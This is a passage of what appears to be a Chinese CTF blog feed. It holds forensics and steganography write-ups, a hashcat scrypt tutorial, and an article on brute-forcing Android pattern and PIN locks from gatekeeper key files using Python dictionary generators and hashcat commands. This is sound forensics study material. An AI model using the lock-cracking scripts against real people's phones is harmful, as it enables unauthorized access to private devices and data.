href="https://www.bilibili.com/video/BV11Y411a7Eo/?spm_id_from=333.337.search-card.all.click&vd_source=60cf53bc00c2d4afa9b53e5b9232bdd2">表达式结果是什么？JS隐式转换把我搞晕了</a></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202142325289.png" alt="image-20230202142325289"></p><p><strong>DASCTF{f8097257d699d7fdba7e97a15c4f94b4}</strong></p><br><h1 id="4-Misc-4"><a href="#4-Misc-4" class="headerlink" title="4.Misc-4"></a>4.Misc-4</h1><ol><li>下载好附件，修改后缀为<code>7z</code>，解压后使用取证大师打开<code>Nox_3-disk2.vmdk</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202190406097.png" alt="image-20230202190406097"></p><p>可以看见很多的加密zip，全部勾选导出</p><ol start="2"><li>打开图片分类，PNG图片，可以看到<code>41.png</code>很明显，也提取出来</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202190757857.png" alt="image-20230202190757857"></p><ol start="3"><li>还有这个jpg图片也导出出来</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202190849998.png" alt="image-20230202190849998"></p><ol start="4"><li>使用<code>exiftool</code>首先查看<code>75.jpg</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202191057591.png" alt="image-20230202191057591"></p><p>得到关键信息<code>XOR DASCTF2022</code></p><ol start="5"><li>使用<code>StegSolve</code>查看<code>41.png</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202191141115.png" alt="image-20230202191141115"></p><ol start="6"><li>使用ps或者其他工具裁剪一下（注意不要裁剪少了,一共256个像素点），我就不演示了图片如下：</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/solved.png" alt="solved"></p><ol start="7"><li>提取二进制，python代码如下</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">&quot;solved.png&quot;</span>, cv2.IMREAD_GRAYSCALE)</span><br><span class="line"></span><br><span class="line">bin_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> img:</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">bin_str += <span class="string">&quot;0&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">bin_str += <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bin_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(bin_str))</span><br></pre></td></tr></table></figure><p><strong>运行结果：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0110010100110000001100010011010100110100001101000110000100111001001100110011001100110011011001010110011000110110001100100110000100110011011000010110000100110010001101110011001100110101001101110110010101100010001101010011001001100101011000010011100001100001</span><br><span class="line">256</span><br></pre></td></tr></table></figure><ol start="8"><li>使用<code>CyberChef</code>，二进制转字符串看看</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202191436751.png" alt="image-20230202191436751"></p><p>得到<code>e01544a9333ef62a3aa27357eb52ea8a</code></p><ol start="9"><li>经过尝试可以解压开来<code>50.zip</code>，打开<code>flag</code>是乱码，根据前面的提示，知道了要异或<code>DASCTF2022</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202191512793.png" alt="image-20230202191512793"></p><p><strong>DASCTF{fe089fecf73daa9dcba9bc385df54605}</strong></p>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实战攻击手机PIN和图案密码</title>
      <link href="/posts/38185.html"/>
      <url>/posts/38185.html</url>
      
        <content type="html"><![CDATA[<h1 id="实战攻击手机PIN和图案密码"><a href="#实战攻击手机PIN和图案密码" class="headerlink" title="实战攻击手机PIN和图案密码"></a>实战攻击手机PIN和图案密码</h1><p><strong>建议：首先你需要已经读过上一篇文章了<a href="https://byxs20.github.io/posts/38184.html">使用hashcat攻击scrypt-hash</a></strong></p><ol><li>攻击手段：通过构造密码，然后比对 <code>scrypt-hash</code> 是否相同，如果相同那就成功爆破到了密码</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203144858271.png" alt="image-20230203144858271"></p><p>首先你要知道这9个点分别表达<code>123456789</code>，还有每个数不可能是重复的（意思就是当第一个数字是1的时候，那第二个必然不会是1，可以是23456789，因为1已经被确定了，所以1就不会再次被使用）</p><ol start="2"><li>我这边推荐使用<code>hashcat</code>爆破，而不是使用python代码，因为速度实在太慢了，我都懒得测到底花了多久时间</li></ol><p>因为密码会存在bytes类型，也就是字节，所以我们攻击时候就需要创建一个字典了，不可以再用掩码的方式了（如果有掩码方式，希望各位大佬可以教教我）</p><ol start="3"><li>使用 <code>X-way</code> 打开 <code>vmdk</code>，找到 <code>\system</code> 分区下面的 <code>gatekeeper.pattern.key</code> 和 <code>device_policies.xml</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203154554524.png" alt="image-20230203154554524"></p><p>打开 <code>device_policies.xml</code> ，可以看到<code>length=7</code>，我们也就确定了有7位，也就是9个小点，有7个被使用了</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203154630818.png" alt="image-20230203154630818"></p><p>然后导出<code>gatekeeper.pattern.key</code>，这里就存储了密码的<code>scrypt-hash</code></p><ol start="4"><li>首先我知道密码是 <code>5842619</code>，我们先测试一下解密脚本是否正确</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> scrypt</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">N = <span class="number">16384</span></span><br><span class="line">r = <span class="number">8</span></span><br><span class="line">p = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;gatekeeper.pattern.key&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">blob = f.read()</span><br><span class="line">meta, salt, signature = struct.unpack_from(<span class="string">&#x27;&lt;17s 8s 32s&#x27;</span>, blob)</span><br><span class="line"></span><br><span class="line">character = <span class="string">&quot;123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="built_in">list</span>(character), <span class="number">7</span>):</span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span>.join(i)</span><br><span class="line">pwd = <span class="string">&quot;5842619&quot;</span> <span class="comment"># 记得删掉</span></span><br><span class="line"></span><br><span class="line">to_hash = meta + pwd.encode()</span><br><span class="line">hash_str = scrypt.<span class="built_in">hash</span>(to_hash, salt, N, r, p, buflen=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> hash_str == signature:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;password: <span class="subst">&#123;pwd&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203155242046.png" alt="image-20230203155242046"></p><p>可以看到成功爆破到了密码 <code>5842619</code>，如果你真的想要使用python脚本爆破，请记得删掉 <code>pwd=&quot;5842619&quot;</code></p><ol start="5"><li>我这边使用 <code>hashcat</code> 来爆破，所以我们需要创建一个字典就好了</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;gatekeeper.pattern.key&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">blob = f.read()</span><br><span class="line">meta, salt, signature = struct.unpack_from(<span class="string">&#x27;&lt;17s 8s 32s&#x27;</span>, blob)</span><br><span class="line"></span><br><span class="line">character = <span class="string">&quot;123456789&quot;</span></span><br><span class="line">crack_scrypt = <span class="string">f&quot;SCRYPT:16384:8:1:<span class="subst">&#123;base64.b64encode(salt).decode()&#125;</span>:<span class="subst">&#123;base64.b64encode(signature).decode()&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;crack_scrypt: <span class="subst">&#123;crack_scrypt&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.dic&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.permutations(<span class="built_in">list</span>(character), <span class="number">7</span>):</span><br><span class="line">pwd = meta + <span class="string">&#x27;&#x27;</span>.join(i).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">f.write(pwd)</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crack_scrypt: SCRYPT:16384:8:1:ns1nIkwWAiw=:fjqzfyxkmN8puEHY989hnSb8f0oBvVcyoHbZzk4PCmA=</span><br></pre></td></tr></table></figure><p><code>SCRYPT:16384:8:1:ns1nIkwWAiw=:fjqzfyxkmN8puEHY989hnSb8f0oBvVcyoHbZzk4PCmA=</code> 就是我们要在hashcat中使用的</p><p>攻击命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe -m 8900 -a 0 &#x27;SCRYPT:16384:8:1:ns1nIkwWAiw=:fjqzfyxkmN8puEHY989hnSb8f0oBvVcyoHbZzk4PCmA=&#x27; .\password.dic</span><br></pre></td></tr></table></figure><p>攻击结果：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203160444199.png" alt="image-20230203160444199"></p><p>可以看到只花了1分钟左右，我这边配置了GPU加速，不过怎么说应该都比python快</p><p>使用下面命令得到密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe -m 8900 -a 0 &#x27;SCRYPT:16384:8:1:ns1nIkwWAiw=:fjqzfyxkmN8puEHY989hnSb8f0oBvVcyoHbZzk4PCmA=&#x27; .\password.dic --show</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCRYPT:16384:8:1:ns1nIkwWAiw=:fjqzfyxkmN8puEHY989hnSb8f0oBvVcyoHbZzk4PCmA=:$HEX[027743a412337c24f4010000000000000035383432363139]</span><br></pre></td></tr></table></figure><p>使用 <code>CyberChef</code> 转换一下</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203161005124.png" alt="image-20230203161005124"></p><p>密码也就是最后7位： <code>5842619</code></p><p>我们现在去解锁试试</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image.gif" alt="image"></p><br><h1 id="补充PIN密码："><a href="#补充PIN密码：" class="headerlink" title="补充PIN密码："></a>补充PIN密码：</h1><p>经过测试PIN密码也是可以被爆破，而且是使用相同的方法，不一样的是文件会不一样</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203165430941.png" alt="image-20230203165430941"></p><p>攻击的文件是：<code>gatekeeper.password.key</code>，这边我设置的密码是123456，查看<code>device_policies.xml</code> 也能看到<code>lenght=6</code></p><p>生成字典的代码需要修改，因为PIN密码的第一个是1，第二个还可以是1，而且要包括数字0了！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="comment"># PIN锁</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;gatekeeper.password.key&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">blob = f.read()</span><br><span class="line">meta, salt, signature = struct.unpack_from(<span class="string">&#x27;&lt;17s 8s 32s&#x27;</span>, blob)</span><br><span class="line"></span><br><span class="line">character = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line">crack_scrypt = <span class="string">f&quot;SCRYPT:16384:8:1:<span class="subst">&#123;base64.b64encode(salt).decode()&#125;</span>:<span class="subst">&#123;base64.b64encode(signature).decode()&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;crack_scrypt: <span class="subst">&#123;crack_scrypt&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.dic&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(<span class="built_in">list</span>(character), repeat=<span class="number">6</span>):</span><br><span class="line">pwd = meta + <span class="string">&#x27;&#x27;</span>.join(i).encode() + <span class="string">b&quot;\n&quot;</span></span><br><span class="line">f.write(pwd)</span><br></pre></td></tr></table></figure><p>攻击命令没有区别，后面怎么获得密码也没区别，下图攻击成功截图：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203170054351.png" alt="image-20230203170054351"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203170423449.png" alt="image-20230203170423449"></p><p>得到密码<code>123456</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203172322352.png" alt="image-20230203172322352"></p><p>同时我还尝试了一下符号密码<code>123!@#</code>，也是可以被爆破</p><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>这两者区别在于，图案长度最多是9个，PIN最低是4位，最高是16位，而且pin还可以用英文大小写符号等等</p><p>所以在字符集上面要多不少攻击数量，我为了速度脚本的字符集是0~9，如果你们实战中可能没爆破出来的话，就要考虑添加字符集了，比如说符号，比如说大小写英文字母</p><br><h1 id="参考教程："><a href="#参考教程：" class="headerlink" title="参考教程："></a>参考教程：</h1><p><a href="https://github.com/dannycoates/scrypt-hash">dannycoates&#x2F;scrypt-hash</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzAxODA3NDc3NA==&mid=2247484582&idx=1&sn=716471f5440de7305ae1a8075e5c7bf9">Cracking gatekeeper.pattern.key</a></p>]]></content>
      
      
      <categories>
          
          <category> 爆破手机图案密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破手机图案密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用hashcat攻击scrypt-hash</title>
      <link href="/posts/38184.html"/>
      <url>/posts/38184.html</url>
      
        <content type="html"><![CDATA[<h1 id="使用hashcat攻击scrypt-hash"><a href="#使用hashcat攻击scrypt-hash" class="headerlink" title="使用hashcat攻击scrypt-hash"></a>使用hashcat攻击scrypt-hash</h1><p><strong>目的：学习这个是为了下一篇文章的爆破手机屏幕的图案密码做准备</strong></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203144858271.png" alt="image-20230203144858271"></p><ol><li>首先你要攻击某一种hash，你首先要去hashcat查看一下是否支持</li></ol><p>我们直接打开：<code>https://hashcat.net/wiki/doku.php?id=example_hashes#legacy_hash_types</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203132951575.png" alt="image-20230203132951575"></p><p>得知我攻击的类型应该为<code>8900</code></p><ol start="2"><li>后面不是给了我们一个攻击示例</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCRYPT:1024:1:1:MDIwMzMwNTQwNDQyNQ==:5FW+zWivLxgCWj7qLiQbeC8zaNQ+qdO0NUinvqyFcfo=</span><br></pre></td></tr></table></figure><p>经过我百度谷歌查找得知，N&#x3D;1024，r&#x3D;1，p&#x3D;1，后面两个base64分别为<code>salt_base64</code>和<code>crack_hash_base64</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCRYPT:&lt;N&gt;:&lt;r&gt;:&lt;p&gt;:&lt;salt_base64&gt;:&lt;crack_hash_base64&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>我们先使用<code>CyberChef</code>手动生成一个<code>scrypt_hash</code></li></ol><p>第一步我们需要准备一个salt <code>0203305404425</code> 然后转为base64 <code>MDIwMzMwNTQwNDQyNQ==</code></p><p>我们进行hash的字符串是 <code>123</code></p><p>我们的参数为：<code>N=1024，r=2，p=1，key_lenght=32</code></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203133625034.png" alt="image-20230203133625034"></p><p>我们得到了scrypt-hash：<code>+SXKnuM8hda53j5MEmOuU+lAWINM/4kooVwq5d+HTpg=</code></p><p>对应攻击的scrypt-hash：<code>&#39;SCRYPT:1024:2:1:MDIwMzMwNTQwNDQyNQ==:+SXKnuM8hda53j5MEmOuU+lAWINM/4kooVwq5d+HTpg=&#39;</code></p><ol start="4"><li>使用hashcat攻击，命令如下</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe -m 8900 -1 123456789 -a 3 <span class="string">&#x27;SCRYPT:1024:2:1:MDIwMzMwNTQwNDQyNQ==:+SXKnuM8hda53j5MEmOuU+lAWINM/4kooVwq5d+HTpg=&#x27;</span> ?1?1?1?1?1?1?1 --increment --increment-min 3 --increment-max 3</span><br></pre></td></tr></table></figure><p>参数解释：</p><p><code>-m 8900</code>，对应我们一开始去网站查表的类型</p><p><code>-1 123456789</code>，我设置了一个自定义的字符集为123456789</p><p><code>SCRYPT:1024:2:1: ... 4kooVwq5d+HTpg=</code>，攻击的scrypt-hash</p><p><code>?1?1?1?1?1?1?1</code>，使用我们自定义的字符集，别问我为什么写那么多，我忘记改了，本来是打算写3个<code>?1</code>的</p><p><code>--increment --increment-min 3 --increment-max 3</code>，最低3个字符，最高也是3个字符，为了节约时间呗</p><ol start="5"><li>如图可以看见攻击成功</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230203134255450.png" alt="image-20230203134255450"></p><p><code>SCRYPT:1024:2:1:MDIwMzMwNTQwNDQyNQ==:+SXKnuM8hda53j5MEmOuU+lAWINM/4kooVwq5d+HTpg=:123</code></p>]]></content>
      
      
      <categories>
          
          <category> 爆破手机图案密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爆破手机图案密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-[NSSRound#7 Team]：IKUN的电脑</title>
      <link href="/posts/59433.html"/>
      <url>/posts/59433.html</url>
      
        <content type="html"><![CDATA[<h1 id="NSSRound-7-Team-：IKUN的电脑"><a href="#NSSRound-7-Team-：IKUN的电脑" class="headerlink" title="[NSSRound#7 Team]：IKUN的电脑"></a>[NSSRound#7 Team]：IKUN的电脑</h1><ol><li>首先使用<code>FTK Imager</code>挂载</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/QQ%E5%9B%BE%E7%89%8720230202202728.png" alt="QQ图片20230202202728"></p><p>可以看到桌面的日记文件夹，全部导出来</p><ol start="2"><li>在<code>2023.1.5</code>有个音频<code>蔡徐坤-Hug-me-_抱我_.wav</code>，打开明显有个杂声在前面，首先本人不才没听过这个歌开头，我搜索了一下，发现本来没有杂音，所以这个杂音肯定有东西</li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202203150380.png" alt="image-20230202203150380"></p><p>我这边一通处理后，先双通道删成单通道，把后面我们家哥哥唱歌部分果断删掉好吧！！</p><ol start="3"><li>然后就是音频转二进制了</li></ol><p>方法一：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.io.wavfile <span class="keyword">import</span> read</span><br><span class="line"></span><br><span class="line">Fs, data = read(<span class="string">&quot;./out.wav&quot;</span>)</span><br><span class="line"></span><br><span class="line">bin_str = <span class="string">&quot;&quot;</span></span><br><span class="line">ret = np.c_[np.unique(data, return_counts=<span class="literal">True</span>)].tolist()</span><br><span class="line">ret = <span class="built_in">sorted</span>(ret, key=<span class="keyword">lambda</span> x: x[-<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> i &gt; <span class="number">15000</span>:</span><br><span class="line">        bin_str += <span class="string">&quot;0&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i &lt; -<span class="number">15000</span>:        </span><br><span class="line">        bin_str += <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="built_in">print</span>(bin_str)</span><br></pre></td></tr></table></figure><p>方法二：</p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202203434851.png" alt="image-20230202203434851"></p><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202203503136.png" alt="image-20230202203503136"></p><p>现在就是解析导出的txt文件了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sample-data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read().splitlines()</span><br><span class="line"></span><br><span class="line">bin_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line"><span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">bin_str += <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">bin_str += <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(bin_str)</span><br></pre></td></tr></table></figure><ol start="4"><li>二进制得到了<code>1.zip</code>文件（省略），解压得到<code>secret.kdbx</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202203905642.png" alt="image-20230202203905642"></p><p>使用<code>rock_you</code>字典爆破，得到密码<code>anaya</code></p><ol start="5"><li>使用<code>keepass</code>打开数据库，输入上面爆破得到的密码，得到了密码<code>ai_you_ni_gan_ma_haha</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202204024816.png" alt="image-20230202204024816"></p><ol start="6"><li>使用密码解压开<code>\2023.1.12\flag.zip</code></li></ol><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/image-20230202204143330.png" alt="image-20230202204143330"></p><p>看到了二维码的标识符了，写代码搞一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">&quot;./flag.png&quot;</span>)</span><br><span class="line">tmp = img[:<span class="number">100</span>, :<span class="number">100</span>]</span><br><span class="line"></span><br><span class="line">r, c = img.shape[:<span class="number">2</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;bin_str.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> y, x <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(<span class="number">0</span>, r, <span class="number">100</span>), <span class="built_in">range</span>(<span class="number">0</span>, c, <span class="number">100</span>)):</span><br><span class="line">        roi_img = img[y: y+<span class="number">100</span>, x: x+<span class="number">100</span>]</span><br><span class="line">        <span class="keyword">if</span> np.<span class="built_in">sum</span>(roi_img == tmp) &gt; <span class="number">25000</span>:</span><br><span class="line">            f.write(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.write(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://byxs20-picture-for-typora.oss-cn-hangzhou.aliyuncs.com/img_for_typora/202302061243008.gif" alt="image (1)"></p><p>后面这个操作是<a href="https://github.com/Byxs20/CTF_Script/blob/main/2%E8%BF%9B%E5%88%B6%E7%BB%98%E5%88%B6%E4%BA%8C%E7%BB%B4%E7%A0%81.py">Byxs20&#x2F;CTF_Script&#x2F;2进制绘制二维码.py</a>，这个脚本完成的</p><p><strong>NSSCTF{031f182e-8ac9-4104-9bca-83b1ef1d11b6}</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>N0wayBack 春节红包题</title>
      <link href="/posts/17560.html"/>
      <url>/posts/17560.html</url>
      
